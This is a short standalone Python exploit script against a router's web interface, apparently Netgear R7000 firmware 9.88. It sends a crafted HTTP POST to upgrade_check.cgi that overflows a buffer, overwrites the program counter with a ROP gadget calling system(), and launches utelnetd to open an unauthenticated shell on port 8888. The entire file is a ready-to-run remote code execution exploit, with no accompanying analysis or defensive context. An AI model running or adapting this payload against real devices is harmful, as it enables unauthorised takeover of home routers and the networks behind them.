import argparse, socket, struct

def p32(address):
	return struct.pack("<I", address)

def send(ip, port, payload):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	sock.close()

parser = argparse.ArgumentParser(description='Run the exploit')
parser.add_argument('ip', type=str, default=None, help='The IP address of the webserver to exploit')
parser.add_argument('-port', type=int, default=80, help='The port of the webserver to exploit')
args = parser.parse_args()

# R7000 9.88
rop_gadget = p32(0x3cfb4) # calls system($sp)
command = "/bin/utelnetd -p8888 -l/bin/sh -d"

data = ""
data += "*#$^\x00" # marker
data += "\x00\x04\x00" # size
data += "A" * 0x60

data += "B" * 0x4  # r4
data += "C" * 0x4  # r5
data += "D" * 0x4  # r6
data += "E" * 0x4  # r7
data += "F" * 0x4  # r8
data += "G" * 0x4  # r9
data += "H" * 0x4  # r10
data += "I" * 0x4  # r11
data += rop_gadget # pc
data += command + "\x00" # Add the command and then NULL-terminate it
data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

payload = ''
payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += 'Host: {}\r\n'.format(args.ip)
payload += 'Content-Disposition: AAAA\r\n'
payload += 'Content-Length: {}\r\n'.format(len(data))
payload += 'Content-Type: application/octet-stream\r\n'
payload += 'name="mtenFWUpload"\r\n'
payload += '\r\n'
payload += data

send(args.ip, args.port, payload)

